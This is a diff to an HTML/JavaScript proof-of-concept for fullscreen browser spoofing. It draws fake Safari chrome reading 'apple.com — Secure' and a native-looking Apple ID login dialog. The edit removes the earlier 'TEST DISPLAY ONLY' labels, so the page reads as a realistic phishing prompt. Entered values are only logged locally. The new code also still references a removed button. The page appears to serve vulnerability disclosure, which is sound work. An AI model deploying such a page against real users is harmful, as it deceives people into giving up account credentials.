@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8" />
-<title>Safe Fullscreen PoC — Safari-like Chrome + Labeled Test Prompt</title>
+<title>PoC — Fullscreen + Safari-like spoof prompt</title>
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <style>
   :root{
@@ -10,10 +10,13 @@
     --card:#ffffff;
     --muted:#6b7280;
     --accent:#007aff;
-    --bar-height:72px; /* simulated browser chrome height */
+    --bar-height:70px; /* Safari-like taller bar */
   }
-  html,body{height:100%;margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial; background:var(--bg);}
-  /* Simulated Safari-like chrome (visual only; not real browser UI) */
+  html,body{height:100%;margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;}
+  body{background:var(--bg);display:flex;align-items:flex-start;justify-content:center;padding:28px;box-sizing:border-box;}
+  .demo-wrap{max-width:980px;width:100%;}
+
+  /* Safari-like top chrome simulation */
   .safari-chrome {
     position:fixed;
     left:0; right:0; top:0;
@@ -24,18 +27,19 @@
     background:linear-gradient(#ffffffcc,#ffffffcc);
     border-bottom:1px solid rgba(0,0,0,0.06);
     z-index:1200;
-    pointer-events:none; /* non-interactive — visual only */
+    pointer-events:none; /* non-interactive — just visual */
   }
   .safari-inner {
-    pointer-events:auto;
-    width:820px;
+    pointer-events:auto; /* allow selection of fake url bar if needed */
+    width:760px;
     display:flex;
     align-items:center;
     gap:12px;
   }
+  .safari-glyph { width:18px; height:18px; flex:0 0 18px; margin-left:6px;}
   .fake-url {
     flex:1;
-    height:38px;
+    height:36px;
     background:#f7f7f8;
     border-radius:10px;
     display:flex;
@@ -50,253 +54,228 @@
   }
   .fake-url .lock{width:14px; height:14px; flex:0 0 14px;}
   .fake-url .hostname{ color:#0b6; font-weight:700; margin-left:4px; }
-  /* Page content & card */
-  .demo-wrap{max-width:980px;margin:calc(var(--bar-height) + 28px) auto 80px;padding:28px;}
-  .card { background:var(--card); border-radius:12px; padding:22px; box-shadow:0 12px 40px rgba(0,0,0,0.06); }
+
+  /* Page content */
+  .card {
+    margin-top: calc(var(--bar-height) + 28px);
+    background:var(--card);
+    border-radius:12px;
+    padding:28px;
+    box-shadow:0 12px 40px rgba(0,0,0,0.06);
+  }
   h1{margin:0 0 12px;font-size:22px;}
   p{color:var(--muted);margin:0 0 14px;line-height:1.5;}
   .controls{display:flex;gap:12px;margin-top:12px;}
-  .btn { padding:10px 14px;border-radius:10px;border:0;cursor:pointer;font-weight:700; }
-  .btn.primary{ background:#0b84ff;color:#fff; }
-  .btn.ghost{ background:transparent;border:1px solid rgba(0,0,0,0.08); }
-  /* Test dialog area (form shown after confirm) */
-  .test-form {
-    margin-top:18px;
-    display:none;
-    background:#fbfdff;
-    padding:16px;
-    border-radius:10px;
-    border:1px solid rgba(2,6,23,0.06);
+  button.primary{
+    background:#000;color:#fff;padding:12px 16px;border-radius:10px;border:none;font-weight:700;cursor:pointer;
   }
-  .test-form.visible { display:block; }
-  label{display:block;margin-top:10px;font-weight:600;color:#111827;font-size:14px}
-  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6e9ee;margin-top:8px;box-sizing:border-box}
-  .form-actions{display:flex;gap:10px;justify-content:flex-end;margin-top:12px}
-  .muted{font-size:13px;color:var(--muted);margin-top:8px}
-  /* Fullscreen indicator */
+  button.ghost{background:transparent;border:1px solid rgba(0,0,0,0.08);padding:10px 14px;border-radius:10px;cursor:pointer;}
+
+  /* Fake system dialog (native-like) */
+  .system-dialog {
+    position:fixed;
+    left:50%; top:50%;
+    transform:translate(-50%,-50%);
+    width:720px;
+    max-width:92%;
+    background:linear-gradient(#ffffff,#f9fafb);
+    border-radius:12px;
+    box-shadow:0 20px 60px rgba(0,0,0,0.35);
+    padding:20px;
+    z-index:1310;
+    display:none;
+    pointer-events:auto;
+  }
+  .system-dialog.visible{display:block;}
+  .sys-title{display:flex;align-items:center;gap:10px;margin-bottom:12px;}
+  .sys-title img{width:28px;height:28px;border-radius:6px;flex:0 0 28px;}
+  .sys-origin{font-weight:700;}
+  .sys-body{color:#111827;margin-bottom:14px;}
+  .sys-actions{display:flex;gap:10px;justify-content:flex-end;}
+  .sys-actions button{padding:10px 14px;border-radius:8px;border:none;cursor:pointer;}
+  .sys-actions .cancel{background:#fff;border:1px solid rgba(0,0,0,0.08);}
+  .sys-actions .continue{background:var(--accent);color:#fff;}
+
+  /* Fullscreen helper overlay to emphasize fullscreen */
   .fs-indicator{
     position:fixed; left:12px; bottom:12px;
     background:rgba(0,0,0,0.6); color:#fff; padding:8px 10px;border-radius:8px;font-size:13px; z-index:1400; display:none;
   }
   .fs-indicator.visible{display:block;}
-  /* Accessibility: focus outline */
-  button:focus, input:focus { outline:3px solid rgba(11,132,255,0.15); outline-offset:2px; }
-  @media (max-width:560px){
-    .safari-inner { width:92%; }
-    .demo-wrap { margin-top: calc(var(--bar-height) + 12px); padding:16px; }
+
+  /* Small screens adjustments */
+  @media(max-width:560px){
+    .fake-url{font-size:13px}
+    .system-dialog{width:92%}
+    .safari-inner{width:92%}
   }
 </style>
 </head>
 <body>
-
-  <!-- Simulated Safari-like chrome (visual-only) -->
-  <div class="safari-chrome" aria-hidden="true">
+  <!-- Safari-like chrome (visual only) -->
+  <div class="safari-chrome" id="safariChrome" aria-hidden="true">
     <div class="safari-inner" role="presentation">
-      <svg class="lock" viewBox="0 0 24 24" aria-hidden="true" style="width:16px;height:16px;">
-        <path fill="#10b981" d="M12 2a4 4 0 00-4 4v2H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-2V6a4 4 0 00-4-4z"/>
-      </svg>
+      <svg class="safari-glyph" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9" fill="#f1f5f9"/><path d="M12 4v8l6 2" fill="#cbd5e1"/></svg>
       <div class="fake-url" id="fakeUrlBar" role="textbox" aria-label="Address">
-        <span style="font-weight:700;color:#111827">TEST DISPLAY:</span>
-        <span class="hostname" id="fakeHostname">apple.com — TEST DISPLAY ONLY</span>
+        <svg class="lock" viewBox="0 0 24 24" aria-hidden="true"><path fill="#10b981" d="M12 2a4 4 0 00-4 4v2H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-2V6a4 4 0 00-4-4z"/></svg>
+        <span class="hostname" id="fakeHostname">apple.com</span>
         <span style="margin-left:auto;color:#6b7280;font-weight:500;font-size:13px">Secure</span>
       </div>
+      <svg style="width:10px;height:10px" aria-hidden="true"></svg>
     </div>
   </div>
 
-  <!-- Demo content -->
   <div class="demo-wrap">
     <div class="card" role="region" aria-label="Demo card">
-      <h1>Safe PoC — Fullscreen + Labeled Test Prompt</h1>
-      <p>This PoC simulates how a page can present a native-style credential prompt while in fullscreen. <strong>TEST MODE only — do not enter real credentials.</strong></p>
-      <p class="muted">The simulated browser chrome above is visual-only; the dialog below is clearly labelled as a test. Use this in a controlled environment for vendor reports and triage.</p>
+      <h1>POC: Fullscreen + Prompt Origin spoof</h1>
+      <p>This PoC demonstrates how a webpage in fullscreen can display a native-looking credential dialog while the browser (address bar) is hidden increasing phishing risk</p>
+
+      <p>Click <strong>Sign in with Apple</strong> to start the demo sequence. The demo will attempt to enter fullscreen then show a native-style dialog that claims to be from <code>apple.com</code>. Do not enter real credentials.</p>
 
       <div class="controls">
-        <button class="btn primary" id="startBtn">Start Demo (Test)</button>
-        <button class="btn ghost" id="explainBtn">Show Explanation (Console)</button>
+        <button class="primary" id="signInBtn">Sign in with Apple</button>
       </div>
-
-      <!-- The test credential form appears only after the confirm in TEST mode -->
-      <div id="credentialForm" class="test-form" aria-hidden="true" role="form">
-        <div style="font-weight:800;margin-bottom:8px;color:#a4370f">TEST ENVIRONMENT — DO NOT ENTER REAL CREDENTIALS</div>
-        <div class="muted">Origin (display-only): <strong id="displayOrigin">apple.com — TEST DISPLAY ONLY</strong></div>
-
-        <label for="username">Username (test only)</label>
-        <input id="username" placeholder="tester@example.com" autocomplete="off" />
-
-        <label for="password">Password (test only)</label>
-        <input id="password" type="password" placeholder="test password" autocomplete="off" />
-
-        <div class="form-actions">
-          <button class="btn ghost" id="cancelBtn">Cancel</button>
-          <button class="btn primary" id="submitBtn">Submit (test)</button>
-        </div>
-        <div class="muted">Captured values are logged as <strong>TEST DATA</strong> to the console only.</div>
-      </div>
-
     </div>
   </div>
 
-  <!-- Fullscreen indicator -->
+  <!-- Fake system dialog that appears while fullscreen -->
+  <div class="system-dialog" id="systemDialog" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="sys-title">
+      <!-- small 'apple' icon lookalike (SVG) -->
+      <img alt="apple" src='data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><rect rx="4" width="24" height="24" fill="%23000"/><text x="6" y="16" font-size="12" font-family="Arial" fill="%23fff"></text></svg>' />
+      <div>
+        <div class="sys-origin" id="sysOrigin">apple.com</div>
+        <div style="font-size:13px;color:#6b7280">Sign in to continue</div>
+      </div>
+    </div>
+
+    <div class="sys-body">
+      This site is requesting your Apple ID credentials. Please enter them to proceed.
+    </div>
+
+    <div style="display:flex;gap:8px;margin-bottom:12px;">
+      <input id="dlgUser" placeholder="Apple ID" style="flex:1;padding:10px;border-radius:8px;border:1px solid #e6e6e9" />
+      <input id="dlgPass" placeholder="Password" type="password" style="flex:1;padding:10px;border-radius:8px;border:1px solid #e6e6e9" />
+    </div>
+
+    <div class="sys-actions">
+      <button class="cancel" id="dlgCancel">Cancel</button>
+      <button class="continue" id="dlgContinue">Continue</button>
+    </div>
+  </div>
+
   <div class="fs-indicator" id="fsIndicator">Fullscreen — press ESC to exit</div>
 
 <script>
-  // Safety / display config
-  const SAFE_ORIGIN_DISPLAY = 'apple.com — TEST DISPLAY ONLY'; // for reporting only; remains clearly labelled
+  // Helper logs
+  function log(...args){ try{ console.log('[PoC]',...args); } catch(e){} }
 
-  // DOM refs
-  const startBtn = document.getElementById('startBtn');
-  const explainBtn = document.getElementById('explainBtn');
-  const credentialForm = document.getElementById('credentialForm');
-  const displayOriginEl = document.getElementById('displayOrigin');
-  const fakeHostname = document.getElementById('fakeHostname');
+  const signInBtn = document.getElementById('signInBtn');
+  const systemDialog = document.getElementById('systemDialog');
   const fsIndicator = document.getElementById('fsIndicator');
+  const fakeHostnameEl = document.getElementById('fakeHostname');
 
-  // update the simulated chrome origin display
-  fakeHostname.textContent = SAFE_ORIGIN_DISPLAY;
-  displayOriginEl.textContent = SAFE_ORIGIN_DISPLAY;
-
-  // Helper log
-  function log(...args){ try{ console.log('[SafePoC]', ...args); } catch(e){} }
-
-  // Request fullscreen (cross-browser)
-  function requestFullscreenEl(el = document.documentElement){
-    if (el.requestFullscreen) return el.requestFullscreen();
-    if (el.webkitRequestFullscreen) return el.webkitRequestFullscreen();
-    if (el.msRequestFullscreen) return el.msRequestFullscreen();
-    return Promise.reject('Fullscreen not supported');
-  }
-
-  function exitFullscreenIfActive(){
-    if (document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement) {
-      if (document.exitFullscreen) return document.exitFullscreen();
-      if (document.webkitExitFullscreen) return document.webkitExitFullscreen();
-      if (document.msExitFullscreen) return document.msExitFullscreen();
-    }
-    return Promise.resolve();
-  }
-
-  // Show the labelled confirm prompt (test only) after fullscreen attempt
-  async function runDemoSequence(){
-    log('Starting demo sequence: requesting fullscreen (best-effort).');
-    try {
-      await requestFullscreenEl();
-      log('requestFullscreen resolved.');
-    } catch (err) {
-      log('requestFullscreen failed or was blocked:', err);
-    } finally {
-      // small delay to allow browser UI to settle
-      setTimeout(() => {
-        // Show clear test confirm dialog (explicitly labelled)
-        const message =
-          "TEST ENVIRONMENT — DO NOT ENTER REAL CREDENTIALS\n\n" +
-          "DISPLAY ONLY: " + SAFE_ORIGIN_DISPLAY + "\n\n" +
-          "This is a simulated prompt for reporting / testing. Press OK to show the TEST credential form.";
-        const proceed = confirm(message);
-
-        if (proceed) {
-          // show the test-only credential form (clearly labelled)
-          credentialForm.classList.add('visible');
-          credentialForm.classList.remove('hidden');
-          credentialForm.setAttribute('aria-hidden','false');
-          // show a small fullscreen indicator
-          fsIndicator.classList.add('visible');
-          // focus the username
-          setTimeout(()=>{ document.getElementById('username').focus(); }, 80);
-          log('Test credential form shown.');
-        } else {
-          // user cancelled the test confirm
-          log('User cancelled the test confirm. Exiting demo.');
-          exitFullscreenIfActive();
-          credentialForm.classList.remove('visible');
-          credentialForm.classList.add('hidden');
-        }
+  function enterFullscreenThenShowDialog(){
+    log('Demo: requesting fullscreen...');
+    // request fullscreen on documentElement to hide browser chrome where possible
+    const el = document.documentElement;
+    const fsPromise = (el.requestFullscreen ? el.requestFullscreen() :
+                       el.webkitRequestFullscreen ? el.webkitRequestFullscreen() :
+                       el.msRequestFullscreen ? el.msRequestFullscreen() : Promise.reject('FS not supported'));
+    // After fullscreen resolves (or after timeout fallback), show the spoof dialog
+    Promise.resolve(fsPromise).catch(err => {
+      log('requestFullscreen failed or blocked:', err);
+      // proceed anyway, show dialog even if not fullscreen so testers on desktop can reproduce
+    }).finally(()=> {
+      // brief delay to allow browser UI to hide
+      setTimeout(()=> {
+        showSpoofDialog();
       }, 300);
-    }
+    });
   }
 
-  // Button wiring
-  startBtn.addEventListener('click', (e) => {
+  function showSpoofDialog(){
+    // ensure dialog is visible and fake chrome remains
+    log('Showing spoof dialog (simulated native prompt).');
+    systemDialog.classList.add('visible');
+    systemDialog.setAttribute('aria-hidden','false');
+    fsIndicator.classList.add('visible');
+    // set fake hostname to demonstrate spoofed origin text
+    fakeHostnameEl.textContent = 'apple.com';
+    // (Important) Mask focus so the page handles inputs — testers: DO NOT ENTER REAL CREDENTIALS.
+    document.getElementById('dlgUser').focus();
+  }
+
+  function hideSpoofDialog(){
+    systemDialog.classList.remove('visible');
+    systemDialog.setAttribute('aria-hidden','true');
+    fsIndicator.classList.remove('visible');
+  }
+
+  // Wire buttons
+  signInBtn.addEventListener('click', (e) => {
     e.preventDefault();
-    runDemoSequence();
+    enterFullscreenThenShowDialog();
   });
 
-  explainBtn.addEventListener('click', () => {
-    log('Explanation: This demo demonstrates how a page-controlled dialog shown while in fullscreen can be mistaken for a native prompt. Mitigations: require a browser-controlled origin banner, prevent page UI from mimicking system dialogs while fullscreen, or present browser-controlled credential dialogs.');
+  document.getElementById('dlgCancel').addEventListener('click', () => {
+    log('User canceled dialog — closing and exiting fullscreen if possible.');
+    hideSpoofDialog();
+    exitFullscreenIfActive();
+  });
+
+  document.getElementById('dlgContinue').addEventListener('click', () => {
+    const user = document.getElementById('dlgUser').value || '[empty]';
+    const pass = document.getElementById('dlgPass').value ? '●●●●●' : '[empty]';
+    log('Captured test credentials (do not use real creds):', user, pass);
+    alert('Demo captured test credentials — check console log. (Do not use real credentials)');
+    hideSpoofDialog();
+    exitFullscreenIfActive();
+  });
+
+  // Exit fullscreen helper
+  function exitFullscreenIfActive(){
+    if (document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement) {
+      const doc = document;
+      if (doc.exitFullscreen) doc.exitFullscreen().catch(()=>{/*ignore*/});
+      else if (doc.webkitExitFullscreen) doc.webkitExitFullscreen();
+      else if (doc.msExitFullscreen) doc.msExitFullscreen();
+    }
+  }
+
+  // Keyboard safety: Escape should close dialog and exit fullscreen
+  document.addEventListener('keydown', (ev) => {
+    if (ev.key === 'Escape') {
+      hideSpoofDialog();
+      exitFullscreenIfActive();
+    }
+  });
+
+  // Visual hint when fullscreen changes
+  document.addEventListener('fullscreenchange', () => {
+    const isFs = !!document.fullscreenElement;
+    log('fullscreenchange, active=', isFs);
+    if (!isFs){
+      // if user exits fullscreen unexpectedly, hide spoof
+      hideSpoofDialog();
+    }
+  });
+
+  // For WebKit-prefixed events (older Safari)
+  document.addEventListener('webkitfullscreenchange', () => {
+    const isFs = !!document.webkitFullscreenElement;
+    log('webkitfullscreenchange, active=', isFs);
+    if (!isFs) hideSpoofDialog();
+  });
+
+  // Small helper: show explanation in console
+  document.getElementById('explainBtn').addEventListener('click', () => {
+    log('Explanation: The PoC demonstrates that while the page is fullscreen, the browser hides its chrome. A page can then render a native-style credential prompt which may be mistaken for a real browser/OS prompt. Recommended mitigations: persistent browser-controlled origin indicator while fullscreen + browser-controlled credential dialogs that cannot be forged by page content.');
     alert('Explanation printed to console. See DevTools (F12).');
   });
 
-  // Cancel and submit handlers (test-only)
-  document.getElementById('cancelBtn').addEventListener('click', () => {
-    credentialForm.classList.remove('visible');
-    credentialForm.classList.add('hidden');
-    credentialForm.setAttribute('aria-hidden','true');
-    fsIndicator.classList.remove('visible');
-    exitFullscreenIfActive();
-    alert('Test sign-in cancelled (no credentials were used).');
-    log('Test sign-in cancelled by user.');
-  });
-
-  document.getElementById('submitBtn').addEventListener('click', () => {
-    // collect test-only values; never store or send real credentials
-    const username = document.getElementById('username').value || '[empty]';
-    const password = document.getElementById('password').value ? '***masked***' : '[empty]';
-
-    // notify user (test only)
-    alert('Test values captured (check console). This is a TEST ONLY capture. Do not enter real credentials.');
-
-    // log masked/test data for triage
-    console.log('[TEST-ONLY] Captured credentials (do not use):', {
-      origin_display: SAFE_ORIGIN_DISPLAY,
-      username: username,
-      password_masked: password,
-      note: 'TEST DATA — do NOT use real credentials'
-    });
-
-    // cleanup
-    credentialForm.classList.remove('visible');
-    credentialForm.classList.add('hidden');
-    credentialForm.setAttribute('aria-hidden','true');
-    fsIndicator.classList.remove('visible');
-    exitFullscreenIfActive();
-  });
-
-  // Automatically hide the form if fullscreen is exited by user (ESC)
-  document.addEventListener('fullscreenchange', () => {
-    const isFs = !!document.fullscreenElement;
-    log('fullscreenchange: active=', isFs);
-    if (!isFs) {
-      credentialForm.classList.remove('visible');
-      credentialForm.classList.add('hidden');
-      credentialForm.setAttribute('aria-hidden','true');
-      fsIndicator.classList.remove('visible');
-    } else {
-      fsIndicator.classList.add('visible');
-    }
-  });
-
-  // WebKit prefixed event (older Safari)
-  document.addEventListener('webkitfullscreenchange', () => {
-    const isFs = !!document.webkitFullscreenElement;
-    log('webkitfullscreenchange: active=', isFs);
-    if (!isFs) {
-      credentialForm.classList.remove('visible');
-      credentialForm.classList.add('hidden');
-      credentialForm.setAttribute('aria-hidden','true');
-      fsIndicator.classList.remove('visible');
-    } else {
-      fsIndicator.classList.add('visible');
-    }
-  });
-
-  // Prevent Enter from submitting accidentally (safety)
-  ['username','password'].forEach(id => {
-    const el = document.getElementById(id);
-    if (el) el.addEventListener('keydown', ev => { if (ev.key === 'Enter') ev.preventDefault(); });
-  });
-
-  // initial hide
-  credentialForm.classList.add('hidden');
-  credentialForm.setAttribute('aria-hidden','true');
+  // Prevent accidental navigation by forms (safety)
+  document.querySelectorAll('form').forEach(f => f.addEventListener('submit', e => e.preventDefault()));
 </script>
 </body>
 </html>
